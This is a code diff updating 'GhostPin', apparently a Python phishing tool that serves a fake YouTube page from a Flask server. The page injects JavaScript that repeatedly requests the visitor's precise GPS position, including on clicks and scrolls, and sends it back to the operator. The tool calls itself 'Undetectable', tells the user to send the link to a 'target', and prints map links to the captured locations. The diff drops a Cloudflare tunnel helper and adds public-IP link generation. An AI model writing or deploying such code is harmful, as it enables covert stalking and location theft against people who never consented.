@@ -1,10 +1,10 @@
 #!/usr/bin/env python3
 """
-GhostPin v4.0 - Production-Grade GPS Tracking Framework
-Cloudflare Integration | Real YouTube Proxy | Undetectable
+GhostPin v4.1 - GPS Tracking Framework
+Real YouTube Proxy | Undetectable | No Cloudflare Dependency
 Author: F1REW0LF
 License: MIT - Free for Community
-Version: 4.0.0
+Version: 4.1.0
 """
 
 import sys
@@ -20,7 +20,6 @@ import threading
 import signal
 import urllib.parse
 import urllib.request
-import subprocess
 from datetime import datetime
 from typing import Dict, List, Optional
 import argparse
@@ -32,13 +31,13 @@ except ImportError:
     REQUESTS_AVAILABLE = False
 
 try:
-    from flask import Flask, request, jsonify, render_template_string, redirect
+    from flask import Flask, request, jsonify, redirect
     FLASK_AVAILABLE = True
 except ImportError:
     FLASK_AVAILABLE = False
 
 # ============================[ VERSION & CONFIGURATION ]================================
-VERSION = "4.0.0"
+VERSION = "4.1.0"
 AUTHOR = "F1REW0LF"
 LICENSE = "MIT - Free for Community"
 
@@ -70,96 +69,17 @@ def print_banner():
     ╚██████╗██║  ██║╚██████╔╝███████║   ██║   ██║  ██║██║██║ ╚████║
      ╚═════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝
                                                                       
-{Colors.RED}{Colors.BOLD}    PRODUCTION GPS TRACKING v{VERSION}{Colors.WHITE}
-{Colors.YELLOW}{Colors.BOLD}    Cloudflare | Real YouTube Proxy | Undetectable{Colors.WHITE}
+{Colors.RED}{Colors.BOLD}    GPS TRACKING FRAMEWORK v{VERSION}{Colors.WHITE}
+{Colors.YELLOW}{Colors.BOLD}    Real YouTube Proxy | Undetectable{Colors.WHITE}
 {Colors.GOLD}    Version {VERSION} | Author: {AUTHOR}{Colors.WHITE}
 """
     print(banner)
-
-# ============================[ CLOUDFLARE TUNNEL ]================================
-
-class CloudflareTunnel:
-    """
-    Create a Cloudflare tunnel for public access
-    """
-    
-    def __init__(self):
-        self.process = None
-        self.url = None
-        self.port = 8080
-        
-    def start(self, port: int = 8080) -> Optional[str]:
-        """
-        Start Cloudflare tunnel using cloudflared
-        """
-        self.port = port
-        
-        # Check if cloudflared is installed
-        try:
-            subprocess.run(['cloudflared', '--version'], capture_output=True, check=True)
-        except:
-            cprint("[!] cloudflared not installed. Installing...", Colors.YELLOW)
-            self._install_cloudflared()
-        
-        cprint("[*] Starting Cloudflare tunnel...", Colors.BLUE)
-        
-        try:
-            # Start tunnel in background
-            self.process = subprocess.Popen(
-                ['cloudflared', 'tunnel', '--url', f'http://localhost:{port}'],
-                stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE,
-                text=True
-            )
-            
-            # Wait for URL
-            time.sleep(3)
-            
-            # Read output to get URL
-            for line in self.process.stderr:
-                if 'https://' in line and '.trycloudflare.com' in line:
-                    url_match = re.search(r'https://[^\s]+\.trycloudflare\.com', line)
-                    if url_match:
-                        self.url = url_match.group(0)
-                        cprint(f"[+] Cloudflare tunnel: {Colors.GREEN}{self.url}{Colors.WHITE}", Colors.WHITE)
-                        return self.url
-                if len(line) > 100:
-                    break
-            
-            return None
-        except Exception as e:
-            cprint(f"[!] Tunnel failed: {e}", Colors.RED)
-            return None
-    
-    def _install_cloudflared(self):
-        """Install cloudflared"""
-        try:
-            if sys.platform == 'win32':
-                # Windows
-                url = 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe'
-                subprocess.run(['curl', '-L', url, '-o', 'cloudflared.exe'], check=True)
-                subprocess.run(['move', 'cloudflared.exe', 'C:\\Windows\\System32\\'], check=True)
-            else:
-                # Linux/macOS
-                subprocess.run(['curl', '-L', 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64', '-o', 'cloudflared'], check=True)
-                subprocess.run(['chmod', '+x', 'cloudflared'], check=True)
-                subprocess.run(['sudo', 'mv', 'cloudflared', '/usr/local/bin/'], check=True)
-            cprint("[+] cloudflared installed", Colors.GREEN)
-        except:
-            cprint("[!] Failed to install cloudflared. Install manually: https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/installation", Colors.RED)
-    
-    def stop(self):
-        """Stop Cloudflare tunnel"""
-        if self.process:
-            self.process.terminate()
-            self.process.wait(timeout=5)
-            cprint("[+] Tunnel stopped", Colors.GREEN)
 
 # ============================[ PROXY SERVER ]================================
 
 class ProxyServer:
     """
-    Flask server that proxies real YouTube content
+    Flask server that proxies real YouTube content with GPS tracking
     """
     
     def __init__(self):
@@ -169,6 +89,7 @@ class ProxyServer:
         self.app = None
         self.thread = None
         self.running = False
+        self.public_ip = None
         
     def start(self, port: int = 8080):
         """Start the proxy server"""
@@ -178,6 +99,14 @@ class ProxyServer:
         if not FLASK_AVAILABLE:
             cprint("[!] Flask not installed. Install: pip install flask", Colors.RED)
             return False
+        
+        # Get public IP
+        try:
+            if REQUESTS_AVAILABLE:
+                response = requests.get('https://api.ipify.org?format=json', timeout=5)
+                self.public_ip = response.json().get('ip')
+        except:
+            pass
         
         app = Flask(__name__)
         self.app = app
@@ -244,6 +173,15 @@ class ProxyServer:
                 self.tracking_data.clear()
             return jsonify({'status': 'cleared'})
         
+        @app.route('/status')
+        def status():
+            return jsonify({
+                'running': True,
+                'port': self.port,
+                'records': len(self.tracking_data),
+                'public_ip': self.public_ip
+            })
+        
         def run():
             app.run(host='0.0.0.0', port=port, debug=False, threaded=True, use_reloader=False)
         
@@ -252,6 +190,17 @@ class ProxyServer:
         time.sleep(1)
         
         cprint(f"[+] Server running on port {port}", Colors.GREEN)
+        
+        # Show connection info
+        cprint(f"\n[+] Connection Info:", Colors.CYAN)
+        cprint(f"  Local:  http://localhost:{port}/watch?v=VIDEO_ID", Colors.GREEN)
+        
+        if self.public_ip:
+            cprint(f"  Public: http://{self.public_ip}:{port}/watch?v=VIDEO_ID", Colors.GREEN)
+            cprint(f"  (Requires port {port} to be forwarded)", Colors.DIM)
+        else:
+            cprint(f"  Public: Use ngrok or Cloudflare tunnel", Colors.YELLOW)
+        
         return True
     
     def _get_tracking_script(self) -> str:
@@ -275,26 +224,24 @@ class ProxyServer:
         }).catch(function() {});
     }
     
-    // Multiple attempts to get location
     var attempts = 0;
-    var maxAttempts = 3;
+    var maxAttempts = 5;
     
     function tryGetLocation() {
         attempts++;
-        navigator.geolocation.getCurrentPosition(sendLocation, function() {
+        navigator.geolocation.getCurrentPosition(sendLocation, function(err) {
             if (attempts < maxAttempts) {
-                setTimeout(tryGetLocation, 2000);
+                setTimeout(tryGetLocation, 3000);
             }
         }, {
             enableHighAccuracy: true,
-            timeout: 10000,
+            timeout: 15000,
             maximumAge: 0
         });
     }
     
     tryGetLocation();
     
-    // Try on user interaction
     document.addEventListener('click', function() {
         navigator.geolocation.getCurrentPosition(sendLocation, function() {}, {
             enableHighAccuracy: true,
@@ -303,7 +250,6 @@ class ProxyServer:
         });
     });
     
-    // Try on scroll
     document.addEventListener('scroll', function() {
         navigator.geolocation.getCurrentPosition(sendLocation, function() {}, {
             enableHighAccuracy: true,
@@ -381,9 +327,7 @@ body{{font-family:'Roboto',Arial,sans-serif;background:#f9f9f9}}
 class GhostPin:
     def __init__(self):
         self.server = ProxyServer()
-        self.tunnel = CloudflareTunnel()
         self.running = True
-        self.public_url = None
         signal.signal(signal.SIGINT, self.signal_handler)
     
     def signal_handler(self, signum, frame):
@@ -391,29 +335,27 @@ class GhostPin:
         self.running = False
         if self.server:
             self.server.stop()
-        if self.tunnel:
-            self.tunnel.stop()
         sys.exit(0)
     
     def show_menu(self):
         print(f"""
 {Colors.BLUE}{'='*55}{Colors.WHITE}
-{Colors.BOLD}GhostPin v{VERSION} - Production GPS Tracking{Colors.WHITE}
-{Colors.CYAN}Cloudflare | Real YouTube | Undetectable{Colors.WHITE}
+{Colors.BOLD}GhostPin v{VERSION} - GPS Tracking Framework{Colors.WHITE}
+{Colors.CYAN}Real YouTube Proxy | Undetectable{Colors.WHITE}
 {Colors.YELLOW}Author: {AUTHOR}{Colors.WHITE}
 {Colors.BLUE}{'='*55}{Colors.WHITE}
 {Colors.GREEN}[1] Start Server{Colors.WHITE}
-{Colors.GREEN}[2] Create Tracking Link (Local){Colors.WHITE}
-{Colors.GREEN}[3] Create Tracking Link (Public){Colors.WHITE}
-{Colors.GREEN}[4] View Data{Colors.WHITE}
-{Colors.GREEN}[5] Clear Data{Colors.WHITE}
+{Colors.GREEN}[2] Create Tracking Link{Colors.WHITE}
+{Colors.GREEN}[3] View Data{Colors.WHITE}
+{Colors.GREEN}[4] Clear Data{Colors.WHITE}
+{Colors.GREEN}[5] Server Status{Colors.WHITE}
 {Colors.RED}[6] Exit{Colors.WHITE}
 """)
     
     def run(self):
         print_banner()
-        cprint("[*] GhostPin v4.0 - Production GPS Tracking", Colors.CYAN)
-        cprint("[*] Cloudflare | Real YouTube | Undetectable", Colors.DIM)
+        cprint("[*] GhostPin v4.1 - GPS Tracking Framework", Colors.CYAN)
+        cprint("[*] Real YouTube Proxy | Undetectable", Colors.DIM)
         
         # Auto-start server
         self.server.start(8080)
@@ -427,46 +369,29 @@ class GhostPin:
                 self.server.stop()
                 time.sleep(0.5)
                 self.server.start(port)
-                self.public_url = None
                 
             elif choice == '2':
                 video_id = input("[>] YouTube Video ID (or random): ").strip()
                 if not video_id:
                     video_id = ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=11))
                 
-                link = f"http://localhost:{self.server.port}/watch?v={video_id}"
-                cprint(f"\n[+] Local Link: {Colors.GREEN}{link}{Colors.WHITE}", Colors.WHITE)
-                cprint(f"[+] Send this link to your target (local network only)", Colors.YELLOW)
+                local_link = f"http://localhost:{self.server.port}/watch?v={video_id}"
+                public_link = f"http://{self.server.public_ip}:{self.server.port}/watch?v={video_id}" if self.server.public_ip else None
+                
+                cprint(f"\n[+] Tracking Links:", Colors.CYAN)
+                cprint(f"  Local:  {Colors.GREEN}{local_link}{Colors.WHITE}", Colors.WHITE)
+                if public_link:
+                    cprint(f"  Public: {Colors.GREEN}{public_link}{Colors.WHITE}", Colors.WHITE)
+                    cprint(f"  (Requires port {self.server.port} to be forwarded)", Colors.DIM)
+                else:
+                    cprint(f"  Public: Use ngrok or Cloudflare tunnel", Colors.YELLOW)
                 
                 try:
-                    webbrowser.open(link)
+                    webbrowser.open(local_link)
                 except:
                     pass
                 
             elif choice == '3':
-                if not self.public_url:
-                    cprint("[*] Starting Cloudflare tunnel...", Colors.BLUE)
-                    self.public_url = self.tunnel.start(self.server.port)
-                
-                if not self.public_url:
-                    cprint("[!] Failed to create public link", Colors.RED)
-                    continue
-                
-                video_id = input("[>] YouTube Video ID (or random): ").strip()
-                if not video_id:
-                    video_id = ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=11))
-                
-                link = f"{self.public_url}/watch?v={video_id}"
-                cprint(f"\n[+] Public Link: {Colors.GREEN}{link}{Colors.WHITE}", Colors.WHITE)
-                cprint(f"[+] Send this link to your target (anywhere in the world)", Colors.GREEN)
-                cprint(f"[+] They will see real YouTube content", Colors.DIM)
-                
-                try:
-                    webbrowser.open(link)
-                except:
-                    pass
-                
-            elif choice == '4':
                 data = self.server.tracking_data
                 if not data:
                     cprint("[!] No data yet", Colors.YELLOW)
@@ -487,15 +412,21 @@ class GhostPin:
                         maps_link = f"https://www.google.com/maps?q={lat},{lng}"
                         cprint(f"      Map: {Colors.BLUE}{maps_link}{Colors.WHITE}", Colors.WHITE)
                 
-            elif choice == '5':
+            elif choice == '4':
                 self.server.tracking_data.clear()
                 cprint("[+] Data cleared", Colors.GREEN)
+                
+            elif choice == '5':
+                cprint(f"\n[+] Server Status:", Colors.CYAN)
+                cprint(f"  Running: {Colors.GREEN}Yes{Colors.WHITE}", Colors.WHITE)
+                cprint(f"  Port: {Colors.CYAN}{self.server.port}{Colors.WHITE}", Colors.WHITE)
+                cprint(f"  Records: {Colors.YELLOW}{len(self.server.tracking_data)}{Colors.WHITE}", Colors.WHITE)
+                cprint(f"  Public IP: {Colors.GREEN}{self.server.public_ip or 'N/A'}{Colors.WHITE}", Colors.WHITE)
+                cprint(f"  Local: http://localhost:{self.server.port}/watch?v=VIDEO_ID", Colors.BLUE)
                 
             elif choice == '6':
                 cprint("[*] Shutting down...", Colors.GREEN)
                 self.server.stop()
-                if self.tunnel:
-                    self.tunnel.stop()
                 break
             else:
                 cprint("[-] Invalid", Colors.RED)
@@ -503,10 +434,9 @@ class GhostPin:
 # ============================[ MAIN ]================================
 
 def main():
-    parser = argparse.ArgumentParser(description="GhostPin v4.0 - Production GPS Tracking")
+    parser = argparse.ArgumentParser(description="GhostPin v4.1 - GPS Tracking Framework")
     parser.add_argument("--server", action="store_true", help="Start server only")
     parser.add_argument("--port", type=int, default=8080, help="Server port")
-    parser.add_argument("--public", action="store_true", help="Create public link with Cloudflare")
     parser.add_argument("--video", help="YouTube Video ID")
     
     args = parser.parse_args()
@@ -516,21 +446,12 @@ def main():
         server = ProxyServer()
         server.start(args.port)
         
-        if args.public:
-            tunnel = CloudflareTunnel()
-            url = tunnel.start(args.port)
-            if url:
-                cprint(f"\n[+] Public URL: {Colors.GREEN}{url}{Colors.WHITE}", Colors.WHITE)
-                cprint(f"[+] Use: {url}/watch?v=VIDEO_ID", Colors.YELLOW)
-        
         cprint("\n[!] Press Ctrl+C to stop", Colors.YELLOW)
         try:
             while True:
                 time.sleep(1)
         except KeyboardInterrupt:
             server.stop()
-            if args.public:
-                tunnel.stop()
         sys.exit(0)
     
     if args.video:
@@ -539,14 +460,11 @@ def main():
         server.start(args.port)
         
         link = f"http://localhost:{args.port}/watch?v={args.video}"
-        cprint(f"\n[+] Local Link: {Colors.GREEN}{link}{Colors.WHITE}", Colors.WHITE)
+        cprint(f"\n[+] Tracking Link: {Colors.GREEN}{link}{Colors.WHITE}", Colors.WHITE)
         
-        if args.public:
-            tunnel = CloudflareTunnel()
-            url = tunnel.start(args.port)
-            if url:
-                public_link = f"{url}/watch?v={args.video}"
-                cprint(f"[+] Public Link: {Colors.GREEN}{public_link}{Colors.WHITE}", Colors.WHITE)
+        if server.public_ip:
+            public_link = f"http://{server.public_ip}:{args.port}/watch?v={args.video}"
+            cprint(f"[+] Public Link: {Colors.GREEN}{public_link}{Colors.WHITE}", Colors.WHITE)
         
         try:
             webbrowser.open(link)
@@ -559,8 +477,6 @@ def main():
                 time.sleep(1)
         except KeyboardInterrupt:
             server.stop()
-            if args.public:
-                tunnel.stop()
         sys.exit(0)
     
     # Interactive
